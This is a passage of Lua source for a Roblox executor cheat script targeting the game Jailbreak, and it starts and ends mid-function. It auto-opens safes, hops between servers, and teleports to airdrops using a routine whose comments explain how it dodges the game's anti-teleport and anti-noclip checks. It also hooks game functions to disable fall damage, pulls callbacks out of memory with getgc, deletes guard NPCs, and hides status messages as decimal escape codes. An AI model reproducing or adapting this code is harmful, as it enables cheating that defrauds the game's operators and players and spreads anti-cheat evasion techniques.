	if _G.AutoOpenSafes == false then
		return sayMessage("Auto opening safes is disabled", Color3.fromRGB(11, 179, 221), "")
	end
	_G.OpeningSafes = true
	for i, v in pairs(tab) do
		if typeof(v) == "table" then
			if v.Id then
				sayMessage("Opening Safe: %s", Color3.fromRGB(11, 179, 221), v.Id)
				game:GetService("ReplicatedStorage").SafeOpenRemote:FireServer(v.Id)
				task.wait(2.6)
			end
		end
	end
	_G.OpeningSafes = false
end)

function GetRejoinPrefferedFunction(...)
	local prnt = sayMessage --rconsoleprint or printconsole or output or print / changed this here so the preferences can set this
	local pcll = pcall
	local req = (syn or http or {}).request or http_request or request -- should handle most exploits worth using
	local jsondecode = function(a)
		return game:GetService("HttpService"):JSONDecode(a)
	end

	local locale
	local function TimeString()
		return DateTime.now():FormatLocalTime("hh:mm:ss.SSS", locale or "en-us")
	end
	local function TableToString(tbl: table, delimit: string, includeNames: boolean) -- cuz table.concat doesn't tostring for you
		tbl = tbl or {}
		delimit = delimit or ""
		local txt
		for i, v in (includeNames and pairs or ipairs)(tbl) do -- use ipairs if not using names, to ensure order
			-- http://lua-users.org/wiki/StringTrim
			-- txt = (txt and ((txt:match'^()%s*$' and '' or txt:match'^%s*(.*%S)').." | ") or "")..(includeNames and ("[%s]=%s"):format(tostring(i),tostring(v)) or tostring(v))
			-- https://stackoverflow.com/questions/51181222/lua-trailing-space-removal/51181334#51181334
			txt = (txt and (string.gsub(txt, "^%s*(.-)%s*$", "%1") .. delimit) or "")
				.. (includeNames and ("[%s]=%s"):format(tostring(i), tostring(v)) or tostring(v))
		end
		return txt or ""
	end
	local prnt_pref_time
	local function Prnt(...)
		local args = { ... }
		local txt = (prnt_pref_time and (TimeString() .. ": ") or "") .. TableToString(args, " | ")
		prnt((prnt == rconsoleprint or prnt == output) and txt:sub(#txt) ~= "\n" and (txt .. "\n") or txt) -- cuz rconsoleprint/output don't put newline at end
	end

	local function GetAllServersForPlace(placeId: number, pref: table)
		pref = pref or {}
		local servers = {} -- to hold the server data as we go
		local cont = true
		local cursor -- for paging the requests, can only get 100 at a time..
		local cnt = 0
		local min_p, max_p, min_f, max_png
		local maxPlayers, maxFps, maxPing = 0, 0, 0
		local function numOrDefZero(val)
			return val and type(val) == "number" and val > 0 and val or 0
		end
		min_p = numOrDefZero(pref.MinPlayers)
		max_p = numOrDefZero(pref.MaxPlayers)
		min_f = numOrDefZero(pref.MinFps)
		max_png = numOrDefZero(pref.MaxPing)

		-- rbx games api info here: https://games.roblox.com/docs#!/Games/get_v1_games_placeId_servers_serverType
		local rbx_games_url_frmt = "https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100%s"
		local cursor_frmt = "&cursor=%s"

		while cont do
			cont = false -- default to discontinue the loop, will only flip to true if we get a next page cursor
			local url =
				rbx_games_url_frmt:format(tostring(placeId), cursor and cursor_frmt:format(tostring(cursor)) or "")
			local succ_rsp, rsp = pcll(function()
				return req({
					Url = url,
					Method = "GET",
				})
			end)
			if succ_rsp and rsp and rsp.StatusCode and rsp.StatusCode == 200 and rsp.Body then
				local succ_jsn, jsn = pcll(function()
					return jsondecode(rsp.Body)
				end)
				if succ_jsn and jsn then
					-- great it worked
					-- set the next page cursor if there is one
					cursor = jsn.nextPageCursor or nil
					if jsn.data then
						cnt = cnt + 1
						if pref.PrintVerbose then
							Prnt("Call#", cnt, "NumSvrs_Before", #servers)
						end
						for i, v in pairs(jsn.data) do
							if v and v.id and v.playing ~= nil and v.fps and v.ping and v.maxPlayers then
								--[[just returning all of what it has, which is: 
								id				string (guid) | this is the server's id, or JobId
								maxPlayers		number | how many players server can support
								playing			number | how many players playing right now
								playerTokens	array of string (tokens) | the tokens of the players playing right now
								fps				number | server's current frames per second for execution
								ping			number | the ping with this server
							]]
								if
									(min_p > 0 and v.playing < min_p) -- filter min players
									or (max_p > 0 and v.playing > max_p) -- filter max players
									or (pref.ExcludeFull and v.playing == v.maxPlayers) -- filter full svr
									or (pref.ExcludeSame and v.id == game.JobId) -- filter same svr
									or (min_f > 0 and v.fps and v.fps < min_f) -- filter min fps
									or (max_png > 0 and v.ping and v.ping > max_png) -- filter max ping
								then
									continue
								end
								v.origord = #servers + 1 -- fallback in case sort weights match
								-- keep the max values found, to be used in sort weights later
								if v.maxPlayers > maxPlayers then
									maxPlayers = v.maxPlayers
								end
								if v.fps > maxFps then
									maxFps = v.fps
								end
								if v.ping > maxPing then
									maxPing = v.ping
								end
								table.insert(servers, v)
							end
						end
						if pref.PrintVerbose then
							Prnt("Call#", cnt, "NumSvrs_After", #servers)
						end
					end
				elseif not succ_jsn and jsn then
					Prnt("Response was success, but json decode failed! Url >>>", url)
					Prnt("ERROR >>>", jsn)
				else
					Prnt(
						"Response was weird wtf! Url >>>",
						url,
						"json decode pcall returned",
						succ_jsn or "nil",
						jsn or "nil"
					)
				end
			elseif not succ_rsp and rsp then
				Prnt("General failure wtf! Url >>>", url)
				Prnt("ERROR >>>", rsp)
			elseif succ_rsp and rsp then
				Prnt("Response was NOT success! Url >>>", url)
				for i, v in pairs(rsp) do
					Prnt(" -- ", i, v)
				end
			else
				Prnt(
					"WTF SHOULD NOT HAPPEN! Url >>>",
					url,
					"request pcall returned >>>",
					succ_rsp or "nil",
					"and >>>",
					rsp or "nil"
				)
			end
			cont = cursor ~= nil
		end
		return servers, maxPlayers, maxFps, maxPing
	end

	local function RejoinPreferredServer(preferences)
		local tm = tick()

		local prefer = {
			SizeSort = "asc",
			MinPlayers = 0,
			MaxPlayers = 0,
			ExcludeFull = true,
			ExcludeSame = true,
			MinFps = 60,
			MaxPing = 190,
			FpsSortWeight = 0,
			PingSortWeight = 5,
			SizeSortWeight = 0,
			PrintVerbose = true,
			PrintPrefixTime = false,
			PrintUseConsoleWindow = false,
		}
		if preferences and type(preferences) == "table" then
			for i, v in pairs(preferences) do
				prefer[i] = v
			end
		end
		if prefer.PrintUseConsoleWindow then
			prnt = rconsoleprint or output or printconsole or sayMessage
		end

		if prnt == rconsoleprint then
			if not syn then
				rconsolecreate()
			end -- noticed SW needs this
			if rconsoleclear then
				rconsoleclear()
			end
		end

		if prefer.PrintPrefixTime then
			locale = game:GetService("LocalizationService").RobloxLocaleId
			prnt_pref_time = true
		end

		Prnt("Current PlaceId", game.PlaceId)
		Prnt("Current (Job)ServerId", game.JobId)
		-- get the servers but also the max plyrs,fps,& ping to use in sort weight math
		local allSvrs, maxPlayers, maxFps, maxPing = GetAllServersForPlace(game.PlaceId, prefer)
		Prnt(
			"Servers Found for PlaceId",
			game.PlaceId,
			"NumSvrs",
			allSvrs and #allSvrs or 0,
			"Time",
			tostring(tick() - tm):sub(1, 6)
		)
		if allSvrs and #allSvrs > 0 then
			local sortTm = tick()
			local sort = prefer.SizeSort and type(prefer.SizeSort) == "string" and prefer.SizeSort or "asc" -- size sort prefer small or large
			local sort_desc = sort:lower() == "desc"
			local function numOrDefaultClamp(val)
				return val and type(val) == "number" and math.clamp(val, 0.01, 1000) or 0.01
			end
			local fps_wgt = numOrDefaultClamp(prefer.FpsSortWeight) -- fps wgt
			local png_wgt = numOrDefaultClamp(prefer.PingSortWeight) -- ping wgt
			local size_wgt = numOrDefaultClamp(prefer.SizeSortWeight) -- size wgt
			local function sortWeight(svr)
				local sz_wgt
				if sort_desc then -- size weight depends on whether its asc or desc
					sz_wgt = svr.playing / maxPlayers * size_wgt
				else
					sz_wgt = (1 - svr.playing / maxPlayers) * size_wgt
				end
				return sz_wgt + svr.fps / maxFps * fps_wgt + (1 - svr.ping / maxPing) * png_wgt -- fps/ping weight always the same way (ping inverted cuz lower is better)
			end
			table.sort(allSvrs, function(a, b)
				local a_w = sortWeight(a)
				local b_w = sortWeight(b)
				if a_w > b_w then
					return true
				elseif a_w == b_w then
					return a.origord < b.origord -- in the rare chance weight is same, use the original order returned by rbx api to ensure table sort does not fail
				else
					return false
				end
			end)

			if prefer.PrintVerbose then
				for i, v in ipairs(allSvrs) do
					if i%1 == 0 then
						task.wait()
					end
					Prnt("SORT", i, v.id, "playing", v.playing, "fps", v.fps, "ping", v.ping) -- if prefer.PrintVerbose dump out full sort order results for all servers found
				end
			end

			if prefer.PrintVerbose then
				Prnt("Sort Time", tick() - sortTm)
			end
			for i, v in ipairs(allSvrs) do
				Prnt(
					("Preferred #%s"):format(tostring(i)),
					v.id,
					("playing %s/%s"):format(tostring(v.playing), tostring(maxPlayers)),
					"fps",
					tostring(v.fps):sub(1, 5),
					"ping",
					v.ping
				)
				Prnt("Teleporting...")
				game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, v.id)
				task.wait(10) -- keep trying in case we fail to teleport to preferred, get next and so on
			end
		else
			Prnt("Found no servers for PlaceId", game.PlaceId, "Time", tostring(tick() - tm):sub(1, 6))
		end
	end

	RejoinPreferredServer(...)
end

function GetTeleportFunction()
	--[[
    Notes: 

    - This script is in early development and can be buggy
    - Some of this code is old and unoptimized
    - This is mainly meant for longer teleports, short teleports inside of buldings and what not would be better to be implemented yourself
    - You have to wait for the current teleport to finish to use it again

    Anticheat Explanation: 

    - Jailbreak has two main movement related security measures: anti teleport and anti noclip
    - Jailbreaks anti noclip works in a way where not only can you not walk through objects, but you also get flagged if you teleport through them
    - Due to cars in jailbreak being faster than players, the anti teleport allows you to move a lot faster if youre inside a car
    - Jailbreaks anti teleport does not flag you for teleporting directly up or directly down
    - The goal of this script is to combine a few methods to make the fastest possible teleporation method while not triggering any of the security measures
    
    Teleportation Steps:

    - Check if the player is under a roof/any object
    - If the player is under a roof, use pathfinding to get to an area which has no roof above it (to avoid getting flagged by the anti noclip when we try to teleport up)
    - Once the player is in an area with no roof above it, teleport into the sky (if we move in the sky, we can avoid going into objects and getting flagged by the anti noclip)
    - Check if the target position is closer than the nearest vehicle, if so, move directly to the target position in the sky and then teleport down to it, if not, continue to next step
    - Move towards the position of above the nearest vehicle 
    - Teleport directly downwards to the vehicle and enter it
    - Teleport the vehicle into the sky 
    - Move the vehicle to the target position in the sky 
    - Teleport the vehicle directly downwards to the target position 
    - Exit the vehicle
]]

	--// services

	local replicated_storage = game:GetService("ReplicatedStorage")
	local run_service = game:GetService("RunService")
	local pathfinding_service = game:GetService("PathfindingService")
	local players = game:GetService("Players")
	local tween_service = game:GetService("TweenService")

	--// variables

	local player = players.LocalPlayer

	local dependencies = {
		variables = {
			up_vector = Vector3.new(0, 500, 0),
			raycast_params = RaycastParams.new(),
			path = pathfinding_service:CreatePath({ WaypointSpacing = 3 }),
			player_speed = 150,
			vehicle_speed = 450,
			teleporting = false,
			stopVelocity = false,
		},
		modules = {
			ui = require(replicated_storage.Module.UI),
			store = require(replicated_storage.App.store),
			player_utils = require(replicated_storage.Game.PlayerUtils),
			vehicle_data = require(replicated_storage.Game.Garage.VehicleData),
			character_util = require(replicated_storage.Game.CharacterUtil),
		},
		helicopters = { Heli = true }, -- heli is included in free vehicles
		motorcycles = { Volt = true }, -- volt type is "custom" but works the same as a motorcycle
		free_vehicles = { Camaro = true },
		unsupported_vehicles = { SWATVan = true },
		door_positions = {},
	}

	local movement = {}
	local utilities = {}

	--// function to toggle if a door can be collided with

	function utilities:toggle_door_collision(door, toggle)
		for index, child in next, door.Model:GetChildren() do
			if child:IsA("BasePart") then
				child.CanCollide = toggle
			end
		end
	end

	--// function to get the nearest vehicle that can be entered

	function utilities:get_nearest_vehicle(tried) -- unoptimized
		local nearest
		local distance = math.huge

		for index, action in next, dependencies.modules.ui.CircleAction.Specs do -- all of the interations
			if
				action.IsVehicle
				and action.ShouldAllowEntry == true
				and action.Enabled == true
				and action.Name == "Enter Driver"
			then -- if the interaction is to enter the driver seat of a vehicle
				local vehicle = action.ValidRoot

				if not table.find(tried, vehicle) and workspace.VehicleSpawns:FindFirstChild(vehicle.Name) then
					if
						not dependencies.unsupported_vehicles[vehicle.Name]
						and (dependencies.modules.store._state.garageOwned.Vehicles[vehicle.Name] or dependencies.free_vehicles[vehicle.Name])
						and not vehicle.Seat.Player.Value
					then -- check if the vehicle is supported, owned and not already occupied
						if
							not workspace:Raycast(
								vehicle.Seat.Position,
								dependencies.variables.up_vector,
								dependencies.variables.raycast_params
							)
						then
							local magnitude = (vehicle.Seat.Position - player.Character.HumanoidRootPart.Position).Magnitude

							if magnitude < distance then
								distance = magnitude
								nearest = action
							end
						end
					end
				end
			end
		end

		return nearest
	end

	--// function to pathfind to a position with no collision above

	function movement:pathfind(tried, attemptnum)
		if not attemptnum then
			attemptnum = 0
		end
		if attemptnum > 5 then
			error("bruh")
		end
		local distance = math.huge
		local nearest

		local tried = tried or {}

		for index, value in next, dependencies.door_positions do -- find the nearest position in our list of positions without collision above
			if not table.find(tried, value) then
				local magnitude = (value.position - player.Character.HumanoidRootPart.Position).Magnitude

				if magnitude < distance then
					distance = magnitude
					nearest = value
				end
			end
		end

		table.insert(tried, nearest)

		utilities:toggle_door_collision(nearest.instance, false)

		local path = dependencies.variables.path
		path:ComputeAsync(player.Character.HumanoidRootPart.Position, nearest.position)

		if path.Status == Enum.PathStatus.Success then -- if path making is successful
			local waypoints = path:GetWaypoints()

			for index = 1, #waypoints do
				local waypoint = waypoints[index]

				player.Character.HumanoidRootPart.CFrame = CFrame.new(waypoint.Position + Vector3.new(0, 2.5, 0)) -- walking movement is less optimal

				if
					not workspace:Raycast(
						player.Character.HumanoidRootPart.Position,
						dependencies.variables.up_vector,
						dependencies.variables.raycast_params
					)
				then -- if there is nothing above the player
					utilities:toggle_door_collision(nearest.instance, true)

					return
				end

				task.wait(0.05)
			end
		end

		utilities:toggle_door_collision(nearest.instance, true)

		movement:pathfind(tried, attemptnum + 1)
	end

	--// function to interpolate characters position to a position

	function movement:move_to_position(part, cframe, speed, car, target_vehicle, tried_vehicles)
		local vector_position = cframe.Position

		if
			not car
			and workspace:Raycast(
				part.Position,
				dependencies.variables.up_vector,
				dependencies.variables.raycast_params
			)
		then -- if there is an object above us, use pathfind function to get to a position with no collision above
			movement:pathfind()
			task.wait(0.5)
		end

		local y_level = 500
		local higher_position = Vector3.new(vector_position.X, y_level, vector_position.Z) -- 500 studs above target position

		repeat -- use velocity to move towards the target position
			local velocity_unit = (higher_position - part.Position).Unit * speed
			part.Velocity = Vector3.new(velocity_unit.X, 0, velocity_unit.Z)

			task.wait()

			part.CFrame = CFrame.new(part.CFrame.X, y_level, part.CFrame.Z)

			if target_vehicle and target_vehicle.Seat.Player.Value then -- if someone occupies the vehicle while we're moving to it, we need to move to the next vehicle
				table.insert(tried_vehicles, target_vehicle)

				local nearest_vehicle = utilities:get_nearest_vehicle(tried_vehicles)
				local vehicle_object = nearest_vehicle and nearest_vehicle.ValidRoot

				if vehicle_object then
					movement:move_to_position(
						player.Character.HumanoidRootPart,
						vehicle_object.Seat.CFrame,
						135,
						false,
						vehicle_object
					)
				end

				return
			end
		until (part.Position - higher_position).Magnitude < 10

		part.CFrame = CFrame.new(part.Position.X, vector_position.Y, part.Position.Z)
		part.Velocity = Vector3.zero
	end

	--// raycast filter

	dependencies.variables.raycast_params.FilterType = Enum.RaycastFilterType.Blacklist
	dependencies.variables.raycast_params.FilterDescendantsInstances =
		{ player.Character, workspace.Vehicles, workspace:FindFirstChild("Rain") }

	workspace.ChildAdded:Connect(function(child) -- if it starts raining, add rain to collision ignore list
		if child.Name == "Rain" then
			table.insert(dependencies.variables.raycast_params.FilterDescendantsInstances, child)
		end
	end)

	for _, child in pairs(workspace:GetChildren()) do
		if child.Name == "Rain" then
			table.insert(dependencies.variables.raycast_params.FilterDescendantsInstances, child)
		end
	end

	player.CharacterAdded:Connect(
		function(character) -- when the player respawns, add character back to collision ignore list
			table.insert(dependencies.variables.raycast_params.FilterDescendantsInstances, character)
		end
	)

	--// get free vehicles, owned helicopters, motorcycles and unsupported/new vehicles

	for index, vehicle_data in next, dependencies.modules.vehicle_data do
		if vehicle_data.Type == "Heli" then -- helicopters
			dependencies.helicopters[vehicle_data.Make] = true
		elseif vehicle_data.Type == "Motorcycle" then --- motorcycles
			dependencies.motorcycles[vehicle_data.Make] = true
		end

		--[[if
			vehicle_data.Type ~= "Chassis"
			and vehicle_data.Type ~= "Motorcycle"
			and vehicle_data.Type ~= "Heli"
			and vehicle_data.Type ~= "DuneBuggy"
			and vehicle_data.Make ~= "Volt"
		then -- weird vehicles that are not supported
			dependencies.unsupported_vehicles[vehicle_data.Make] = true
		end]]

		if not vehicle_data.Price then -- free vehicles
			dependencies.free_vehicles[vehicle_data.Make] = true
		end
	end

	--// get all positions near a door which have no collision above them

	for index, value in next, workspace:GetChildren() do
		if value.Name:sub(-4, -1) == "Door" then
			local touch_part = value:FindFirstChild("Touch")

			if touch_part and touch_part:IsA("BasePart") then
				for distance = 5, 100, 5 do
					local forward_position, backward_position =
						touch_part.Position + touch_part.CFrame.LookVector * (distance + 3),
						touch_part.Position
							+ touch_part.CFrame.LookVector * -(distance + 3) -- distance + 3 studs forward and backward from the door

					if
						not workspace:Raycast(
							forward_position,
							dependencies.variables.up_vector,
							dependencies.variables.raycast_params
						)
					then -- if there is nothing above the forward position from the door
						table.insert(dependencies.door_positions, { instance = value, position = forward_position })

						break
					elseif
						not workspace:Raycast(
							backward_position,
							dependencies.variables.up_vector,
							dependencies.variables.raycast_params
						)
					then -- if there is nothing above the backward position from the door
						table.insert(dependencies.door_positions, { instance = value, position = backward_position })

						break
					end
				end
			end
		end
	end

	--// no fall damage or ragdoll

	local old_is_point_in_tag = dependencies.modules.player_utils.isPointInTag
	dependencies.modules.player_utils.isPointInTag = function(point, tag)
		if dependencies.variables.teleporting and tag == "NoRagdoll" or tag == "NoFallDamage" then
			return true
		end

		return old_is_point_in_tag(point, tag)
	end

	--// stop velocity

	task.spawn(function()
		while task.wait() do
			if
				dependencies.variables.stopVelocity
				and player.Character
				and player.Character:FindFirstChild("HumanoidRootPart")
			then
				player.Character.HumanoidRootPart.Velocity = Vector3.zero
			end
		end
	end)

	--// main teleport function (not returning a new function directly because of recursion)

	local function teleport(cframe, tried) -- unoptimized
		local relative_position = (cframe.Position - player.Character.HumanoidRootPart.Position)
		local target_distance = relative_position.Magnitude

		if
			target_distance <= 20
			and not workspace:Raycast(
				player.Character.HumanoidRootPart.Position,
				relative_position.Unit * target_distance,
				dependencies.variables.raycast_params
			)
		then
			player.Character.HumanoidRootPart.CFrame = cframe

			return
		end

		local tried = tried or {}
		local nearest_vehicle = utilities:get_nearest_vehicle(tried)
		local vehicle_object = nearest_vehicle and nearest_vehicle.ValidRoot

		dependencies.variables.teleporting = true

		if vehicle_object then
			local vehicle_distance = (vehicle_object.Seat.Position - player.Character.HumanoidRootPart.Position).Magnitude

			if target_distance < vehicle_distance then -- if target position is closer than the nearest vehicle
				movement:move_to_position(
					player.Character.HumanoidRootPart,
					cframe,
					dependencies.variables.player_speed
				)
			else
				if vehicle_object.Seat.PlayerName.Value ~= player.Name then
					movement:move_to_position(
						player.Character.HumanoidRootPart,
						vehicle_object.Seat.CFrame,
						dependencies.variables.player_speed,
						false,
						vehicle_object,
						tried
					)

					dependencies.variables.stopVelocity = true

					local enter_attempts = 1

					repeat -- attempt to enter car
						nearest_vehicle:Callback(true)

						enter_attempts = enter_attempts + 1

						task.wait(0.1)
					until enter_attempts == 10 or vehicle_object.Seat.PlayerName.Value == player.Name

					dependencies.variables.stopVelocity = false

					if vehicle_object.Seat.PlayerName.Value ~= player.Name then -- if it failed to enter, try a new car
						table.insert(tried, vehicle_object)

						return teleport(cframe, tried or { vehicle_object })
					end
				end

				local vehicle_root_part -- inline conditional would be way too long

				if dependencies.helicopters[vehicle_object.Name] then -- each type of vehicle has a different root part, which is why we sort them so we can do this
					vehicle_root_part = vehicle_object.Model.TopDisc
				elseif dependencies.motorcycles[vehicle_object.Name] then
					vehicle_root_part = vehicle_object.CameraVehicleSeat
				elseif vehicle_object.Name == "DuneBuggy" then
					vehicle_root_part = vehicle_object.BoundingBox
				else
					vehicle_root_part = vehicle_object.PrimaryPart
				end

				movement:move_to_position(vehicle_root_part, cframe, dependencies.variables.vehicle_speed, true)

				repeat -- attempt to exit car
					task.wait(0.15)
					dependencies.modules.character_util.OnJump()
				until vehicle_object.Seat.PlayerName.Value ~= player.Name
			end
		else
			movement:move_to_position(player.Character.HumanoidRootPart, cframe, dependencies.variables.player_speed)
		end

		task.wait(0.5)
		dependencies.variables.teleporting = false
	end

	return teleport
end

local REGION_Y_POSITION = 512
local regions = {
	-- general areas
	["City"] = {
		Position = CFrame.new(206.5, REGION_Y_POSITION, 2006.75),
		Size = Vector3.new(5248, 2018, 3456),
		Priority = 0,
	},
	["Crater City"] = {
		Position = CFrame.new(654.5, REGION_Y_POSITION, -4585.25),
		Size = Vector3.new(6144, 2048, 4096),
		Priority = 0,
	},
	["Desert"] = {
		Position = CFrame.new(1230.5, REGION_Y_POSITION, -297.25),
		Size = Vector3.new(3456, 2048, 1152),
		Priority = 0,
	},
	["Prison"] = {
		Position = CFrame.new(-1521.5, REGION_Y_POSITION, -873.25),
		Size = Vector3.new(2048, 2048, 3328),
		Priority = 1, -- city cuts into it a bit
	},
	["Small Town"] = {
		Position = CFrame.new(1390.5, REGION_Y_POSITION, -1705.25),
		Size = Vector3.new(3776, 2048, 1664),
		Priority = 0,
	},

	["Casino"] = {
		Position = CFrame.new(-19.5, 512, -4673.25),
		Size = Vector3.new(764, 2048, 624),
		Priority = 10,
	},
	["Cargo Airport"] = {
		Position = CFrame.new(-1452.5, REGION_Y_POSITION, 2861.75),
		Size = Vector3.new(1095, 2048, 736),
		Priority = 5,
	},
	["Volcano Base"] = {
		Position = CFrame.new(1921.5, 512, -2603.25),
		Size = Vector3.new(1707, 2048, 1422),
		Priority = 5,
	},
	["Jewelry Store"] = {
		Position = CFrame.new(126.5, REGION_Y_POSITION, 1318.75),
		Size = Vector3.new(360, 2048, 360),
		Priority = 5,
	},
	["Power Plant"] = {
		Position = CFrame.new(103.5, 512, 2323.75),
		Size = Vector3.new(415, 2048, 588),
		Priority = 5,
	},
	["City Criminal Base"] = {
		Position = CFrame.new(-463.5, REGION_Y_POSITION, 1864.75),
		Size = Vector3.new(765, 2048, 926),
		Priority = 10,
	},
	["Tomb"] = {
		Position = CFrame.new(621.5, -93, -486.25),
		Size = Vector3.new(790, 206, 728),
		Priority = 5,
	},
	["Museum"] = {
		Position = CFrame.new(1118.5, REGION_Y_POSITION, 1304.75),
		Size = Vector3.new(720, 2048, 720),
		Priority = 5,
	},
	["Military Base"] = {
		Position = CFrame.new(734.5, REGION_Y_POSITION, 413.75),
		Size = Vector3.new(424, 2048, 740),
		Priority = 5,
	},
	["Police Station"] = {
		Position = CFrame.new(726.5, REGION_Y_POSITION, 1063.75),
		Size = Vector3.new(306, 2048, 442),
		Priority = 10,
	},
	["Police Headquarters"] = {
		Position = CFrame.new(211.5, REGION_Y_POSITION, 1110.75),
		Size = Vector3.new(202, 2048, 286),
		Priority = 10,
	},
	["Crater Airport"] = {
		Position = CFrame.new(-826.5, REGION_Y_POSITION, -4893.25),
		Size = Vector3.new(959, 2048, 686),
		Priority = 5,
	},
}

function getHighestPriorityRegion(regionList)
	local highestName, highestInfo
	for regionName, regionInfo in pairs(regionList) do
		if not highestInfo or (regionInfo.Priority > highestInfo.Priority) then
			highestName, highestInfo = regionName, regionInfo
		end
	end

	return highestName
end

function GetCollectCashFunction()
	for _, v in pairs(getgc(true)) do
		if typeof(v) == "table" then
			if rawget(v, 1) then
				if typeof(rawget(v, 1)) == "table" then
					if typeof(rawget(v, 1)) == "table" then
						if typeof(rawget(rawget(v, 1), "Callback")) == "function" then
							if not rawget(rawget(v, 1), "Command") then
								for _, v in pairs(v) do
									--print(v.Name)
									if v.Name:match("^Collect") and v.Name:match("from .+$") then
										_G.COLLECT_CASH_FUNCTION = v.Callback
										--rconsoleinfo("Successfully Obtained Collect Cash Remote - ColRealPro")
										break
									end
								end
							end
						end
					end
				end
			end
			--break
		end
	end
end

function GetLocation(model)
	local AirdropOverlapParams = OverlapParams.new()
	AirdropOverlapParams.FilterType = Enum.RaycastFilterType.Whitelist
	AirdropOverlapParams.FilterDescendantsInstances = { model }

	local modelRegions = {}
	for regionName, regionInfo in pairs(regions) do
		local foundParts = workspace:GetPartBoundsInBox(regionInfo.Position, regionInfo.Size, AirdropOverlapParams)
		if #foundParts >= 1 then
			modelRegions[regionName] = regionInfo
		end
	end

	local modelArea = getHighestPriorityRegion(modelRegions)

	if not modelArea then
		modelArea = "???"
	end

	return modelArea
end

local teleport = GetTeleportFunction()

function Change()
	sayMessage("\67\104\97\110\103\105\110\103\32\83\101\114\118\101\114\115", Color3.fromRGB(11, 179, 221), "")
	local rejoinPreferred = --[[loadstring(
		game:HttpGetAsync("https://raw.githubusercontent.com/Kozenomenon/RBX_Pub/main/Misc/Rejoin_Preferred_Server.lua")
	)]]GetRejoinPrefferedFunction()
	rejoinPreferred({
		SizeSort = "asc", -- 'asc' or 'desc' - asc will prefer smallest, desc will prefer largest (num players). default is asc.
		MinPlayers = 12, -- 0 is unused, >0 will filter servers with less players than this number
		MaxPlayers = 28, -- 0 is unused, >0 will filter servers with more players than this number
		ExcludeFull = true, -- will filter any servers that are full (at server's max players)
		ExcludeSame = true, -- will filter the current server- to ensure you go someplace else
		MinFps = 0, -- 0 is unused, >0 will filter any servers that do not have at least this FPS
		MaxPing = 0, -- 0 is unused, >0 will filter any servers whose ping is higher than this
		-- don't mess with these unless you understand what a weighted sort is
		FpsSortWeight = 0, -- weight to apply to fps for sorting. higher value makes better (higher) fps impact sort more
		PingSortWeight = 5, -- weight to apply to ping for sorting. higher value makes better (lower) ping impact sort more
		SizeSortWeight = 0, -- weight for size (num players) for sorting. higher value makes preferred size (asc/desc) impact sort more
		-- you probably don't need these
		PrintVerbose = true, -- if true will output much more, including full server list sorted
		PrintPrefixTime = false, -- if true will prefix all prints with time hh:mm:ss.SSS
		PrintUseConsoleWindow = false, -- if true will use a separate console window for all print output (if exploit can do that, or falls back to print)
	})
end

function Loop(Obj, a)
	if Obj.Name == "Drop" then
		repeat
			wait()
		until Obj:FindFirstChild("Post")

		local AirDropLocation = GetLocation(Obj)

		if
			Obj:WaitForChild("Post").Color == Color3.fromRGB(148, 96, 69)
			or Obj:WaitForChild("Post").BrickColor == BrickColor.new("Dark orange")
		then
			sayMessage(
				"\65\110\32\97\105\114\100\114\111\112\32\104\97\115\32\98\101\101\110\32\102\111\117\110\100\32\110\101\97\114\32\116\104\101\32\37\115",
				Color3.fromRGB(148, 96, 69),
				AirDropLocation
			)
		elseif
			Obj:WaitForChild("Post").Color == Color3.fromRGB(147, 44, 53)
			or Obj:WaitForChild("Post").BrickColor == BrickColor.new("Dark red")
		then
			sayMessage(
				"\65\110\32\97\105\114\100\114\111\112\32\104\97\115\32\98\101\101\110\32\102\111\117\110\100\32\110\101\97\114\32\116\104\101\32\37\115",
				Color3.fromRGB(147, 44, 53),
				AirDropLocation
			)
		elseif
			Obj:WaitForChild("Post").Color == Color3.fromRGB(49, 98, 149)
			or Obj:WaitForChild("Post").BrickColor == BrickColor.new("Storm blue")
		then
			sayMessage(
				"\65\110\32\97\105\114\100\114\111\112\32\104\97\115\32\98\101\101\110\32\102\111\117\110\100\32\110\101\97\114\32\116\104\101\32\37\115",
				Color3.fromRGB(49, 98, 149),
				AirDropLocation
			)
		end
	end
	if Obj.Name == "Drop" then
		CreateWebhook("Stats", {
			["embeds"] = {
				{
					["title"] = "Current stats for user "
						.. game:GetService("Players").LocalPlayer.Name
						.. " ("
						.. tostring(DateTime.now():FormatUniversalTime("MMM D h:mm A", "en-us"))
						.. " UDT)",
					["description"] = "Profile: https://roblox.com/users/"
						.. game:GetService("Players").LocalPlayer.UserId,
					["color"] = 0x0bb3dd,
					--[[["fields"] = {
					{
						["name"] = "Total Gained:",
						["value"] = tostring(diff),
					},
					{
						["name"] = "Runtime:",
						["value"] = tostring(str),
					},
					{
						["name"] = "Cash per hour:",
						["value"] = tostring(math.floor(diff / (RunTime / 60 / 60))),
					},
				}]]
					["fields"] = {
						{
							["name"] = "Stats:",
							["value"] = "**Total Gained: **"
								.. tostring(diff)
								.. "\n**Runtime: **"
								.. tostring(str)
								.. "\n**Cash per hour: **"
								.. tostring(math.floor(diff / (RunTime / 60 / 60))),
						},
					},
				},
			},
		})
		if
			not pcall(function()
				local qualified = true
				if
					game:GetService("Workspace").Drop.Countdown.Billboard.Enabled == true
					and not tonumber(game:GetService("Workspace").Drop.Countdown.Billboard.TextLabel.Text) < 60
				then
					local timeleft = tonumber(game:GetService("Workspace").Drop.Countdown.Billboard.TextLabel.Text)
					if timeleft > 60 then
						qualified = true
					end
				else
					qualified = true
				end
				if not qualified then
					error("not qualified")
				end
			end)
		then
			return sayMessage(
				"\66\97\100\32\65\105\114\100\114\111\112\44\32\83\107\105\112\112\105\110\103",
				Color3.fromRGB(11, 179, 221),
				""
			)
		end
		task.wait(23)
		sayMessage(
			"\84\101\108\101\112\111\114\116\105\110\103\32\116\111\32\97\105\114\100\114\111\112",
			Color3.fromRGB(11, 179, 221),
			""
		)
		require(game:GetService("ReplicatedStorage").Game.TeamChooseUI).Hide()
		workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
		if game:GetService("Players").LocalPlayer.Character then
			if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Humanoid") then
				workspace.CurrentCamera.CameraSubject = game:GetService("Players").LocalPlayer.Character
					:FindFirstChild("Humanoid")
			end
		end
		if not pcall(function()
			teleport(game:GetService("Workspace").Drop.PrimaryPart.CFrame)
		end) then
			return
		end
		if workspace:FindFirstChild("GuardNPCPlayers") then
			workspace:FindFirstChild("GuardNPCPlayers"):Destroy()
		end
		repeat
			if not game:GetService("Workspace"):FindFirstChild("Drop") then
				break
			end
